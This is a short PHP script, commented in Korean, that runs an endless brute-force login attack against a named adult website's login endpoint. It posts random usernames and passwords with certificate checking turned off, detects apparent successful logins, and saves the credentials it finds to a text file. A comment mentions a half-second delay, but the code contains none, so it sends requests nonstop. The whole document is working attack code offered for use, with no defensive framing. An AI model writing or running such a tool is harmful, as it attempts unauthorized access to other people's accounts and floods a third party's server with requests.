<?php
// 무작위 로그인 무한 시도
$url = "https://koreansexgirl01.com/login_update.php";
$attempt = 0;
$success = 0;

// 무작위 문자열 생성
function randomString($length = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return substr(str_shuffle($chars), 0, $length);
}

echo "=== 무작위 로그인 시도 시작 (Ctrl+C로 중지) ===\n\n";

// 무한 루프
while (true) {
    $attempt++;
    $username = randomString(rand(4, 10));
    $password = randomString(rand(4, 10));
    
    // POST 데이터
    $data = array(
        'username' => $username,
        'password' => $password
    );
    
    // cURL 설정
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // 리다이렉트 따라가기
    
    // 요청 실행
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);
    
    // 성공 조건 체크 (alert가 없고, 다른 페이지로 이동했거나, 특정 텍스트가 있을 때)
    if (!strpos($response, '존재하지 않는 아이디') && 
        !strpos($response, 'alert') && 
        ($finalUrl != $url || strpos($response, 'logout') || strpos($response, '로그아웃'))) {
        
        $success++;
        echo "\n🎯 [성공!] 시도 #$attempt\n";
        echo "   아이디: $username\n";
        echo "   비밀번호: $password\n";
        echo "   최종 URL: $finalUrl\n";
        echo "   응답 일부: " . substr(strip_tags($response), 0, 100) . "...\n";
        echo "   ----------------------------------------\n";
        
        // 성공한 계정 정보를 파일에 저장
        file_put_contents('success_accounts.txt', 
            date('Y-m-d H:i:s') . " - $username / $password\n", 
            FILE_APPEND
        );
    } else {
        // 실패는 간단히 표시
        echo "\r시도: $attempt | 성공: $success | 현재: $username / $password";
    }
    
    // 너무 빠른 요청 방지 (0.5초 대기)
}
?>